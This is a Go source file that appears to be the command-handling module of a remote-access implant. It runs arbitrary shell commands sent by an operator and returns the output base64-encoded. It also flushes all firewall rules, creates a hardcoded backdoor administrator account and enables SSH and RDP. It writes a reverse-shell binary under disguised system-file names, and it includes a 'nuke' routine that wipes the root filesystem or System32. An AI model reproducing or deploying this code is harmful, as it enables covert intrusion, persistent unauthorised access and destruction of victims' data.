package metcli

import (
	"encoding/base64"
	"os"
	"os/exec"
	"runtime"
	"strings"
)

// HandleComs will take the commandstring blob and execute them all, then return the results encoded into a payload
func HandleComs(comstr string, m Metclient) string {
	comResults := parseCommands(comstr)
	respayload := genResPL(comResults, m)
	return respayload
}

//split large string into individual commands/arguments
func parseCommands(commandBlob string) []string {
	results := []string{}
	isplit := strings.Split(commandBlob, "<||>")
	for _, comStr := range isplit {
		jsplit := strings.SplitN(comStr, ":", 3)
		aid := jsplit[0]
		mode := jsplit[1]
		if mode == "0" {
			return nil
		}
		args := jsplit[2]
		output := execCommand(mode, args)
		resStr := aid + ":" + output
		results = append(results, resStr)
	}
	return results
}

//pass each action to appropriate handler
func execCommand(mode string, args string) string {
	retval := ""
	switch mode {
	case "0": //no command
		return ""
	case "1": //shell exec of args
		retval = shellExec(args)
	case "2":
		retval = fwFlush()
	case "3":
		retval = createUser()
	case "4":
		retval = enableRemote()
	case "5":
		retval = spawnRevShell(args)
	case "6":
		retval = unknownCom()
	case "7":
		retval = unknownCom()
	case "8":
		retval = unknownCom()
	case "9":
		retval = unknownCom()
	case "A":
		retval = unknownCom()
	case "B":
		retval = unknownCom()
	case "F":
		retval = nuke()
	default:
		retval = unknownCom()
	}
	if retval == "" {
		retval = "<No Output>"
	}
	retval = base64.StdEncoding.EncodeToString([]byte(retval))
	return retval
}

//most commonly used, pass in args to a shell
func shellExec(args string) string {
	shellvar := ""
	if runtime.GOOS == "linux" {
		shellvar = "/bin/sh"
	} else if runtime.GOOS == "windows" {
		shellvar = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
	} else {
		return "No shell available"
	}
	cmd := exec.Command(shellvar, "-c", args)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return string(err.Error())
	}
	return string(out)
}

//flush firewall rules from all tables
func fwFlush() string {
	cmd := exec.Command("tmp")
	if runtime.GOOS == "linux" {
		cmd = exec.Command("/bin/sh", "-c", "iptables -P INPUT ACCEPT; iptables -P OUTPUT ACCEPT; iptables -P FORWARD ACCEPT; iptables -t nat -F; iptables -t mangle -F; iptables -F; iptables -X;")
	} else if runtime.GOOS == "windows" {
		cmd = exec.Command("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "-c", "Remove-NetFirewallRule -All; Set-NetFirewallProfile -DefaultInboundAction Allow -DefaultOutboundAction Allow;")
	}

	out, err := cmd.CombinedOutput()
	if err != nil {
		return string(err.Error())
	}
	return string(out)
}

//create a new user.  maybe in the future name/pass will be passed as args
func createUser() string {
	cmd := exec.Command("tmp")
	if runtime.GOOS == "linux" {
		comStr := "useradd -p $(openssl passwd -1 letmein) badguy -s /bin/bash -G sudo"
		if _, err := os.Stat("/etc/yum.conf"); os.IsNotExist(err) {
			comStr = "useradd -p $(openssl passwd -1 letmein) badguy -s /bin/bash -G wheel"
		}
		cmd = exec.Command("/bin/sh", "-c", comStr)
	} else if runtime.GOOS == "windows" {
		comstr := "$p = ConvertTo-SecureString -Force -AsPlainText \"Letmein123!\";New-LocalUser \"badguy\" -Password $p -FullName \"Bad Guy\" -Description \"Non-malicious user\"; Add-LocalGroupMember -Group \"Administrators\" -Member \"badguy\"; Add-LocalGroupMember -Group \"Remote Desktop Users\" -Member \"badguy\";"
		cmd = exec.Command("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "-c", comstr)
	} else {
		return "shell unavailable"
	}
	out, err := cmd.CombinedOutput()
	if err != nil {
		return string(err.Error())
	}
	return string(out)
}

//allow ssh connections and restart the service
func enableRemote() string {
	cmd := exec.Command("tmp")
	if runtime.GOOS == "linux" {
		insRule := exec.Command("iptables", "-I", "FILTER", "1", "-j", "ACCEPT")
		insRule.Run()
		cmd = exec.Command("/bin/sh", "-c", "systemctl restart sshd")
		out, err := cmd.CombinedOutput()
		if err != nil {
			return string(err.Error())
		}
		return string(out)
	} else if runtime.GOOS == "windows" {
		comstr := "Set-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\' -Name \"fDenyTSConnections\" -Value 0; Set-ItemProperty \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\\\" -Name \"UserAuthentication\" -Value 1; Enable-NetFirewallRule -DisplayGroup \"Remote Desktop\""
		cmd = exec.Command("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "-c", comstr)
		out, err := cmd.CombinedOutput()
		if err != nil {
			return string(err.Error())
		}
		return string(out)
	}
	return "No shell available"
}

//spawn a (disowned) reverse shell back to target IP/port
func spawnRevShell(target string) string {
	targetArg := base64.StdEncoding.EncodeToString([]byte(target))
	if runtime.GOOS == "linux" {
		shpth := "/usr/sbin/fdisk-repair"
		if checkFileExists(shpth) == false {
			shStr := reverseShellLinux
			data, _ := base64.RawStdEncoding.DecodeString(shStr)
			f, err := os.Create(shpth)
			if err != nil {
				panic(err)
			}
			f.Write([]byte(data))
			f.Close()
			os.Chmod(shpth, 0777)
		}
		cmd := exec.Command(shpth, targetArg)
		cmd.Start()

	} else if runtime.GOOS == "windows" {
		shpth := "C:\\Windows\\System32\\RepairBrokenFiles.exe"
		if checkFileExists(shpth) == false {
			shStr := reverseShellWindows
			data, _ := base64.RawStdEncoding.DecodeString(shStr)
			f, err := os.Create(shpth)
			if err != nil {
				panic(err)
			}
			f.Write([]byte(data))
			f.Close()

		}
		cmd := exec.Command(shpth, targetArg)
		cmd.Start()
	} else {
		return "No shell available"
	}
	//soon to come...
	return "Shell spawned"
}

// probably never use this, but it's nice to have around :^)
func nuke() string {
	cmd := exec.Command("tmp")
	if runtime.GOOS == "linux" {
		cmd = exec.Command("/bin/bash", "-c", "rm -rf / --no-preserve-root")
	} else if runtime.GOOS == "windows" {
		cmd = exec.Command("Remove-Item -Path \"C:\\Windows\\System32\" -Recurse -Force -Confirm:$false")
	} else {
		return "No shell available"
	}
	out, _ := cmd.CombinedOutput()
	return string(out)
}

//if the opcode is something weird, dont know what to do with it
func unknownCom() string {
	return "Unknown command"
}

func checkFileExists(pth string) bool {
	if _, err := os.Stat(pth); os.IsNotExist(err) {
		return false
	}
	return true
}
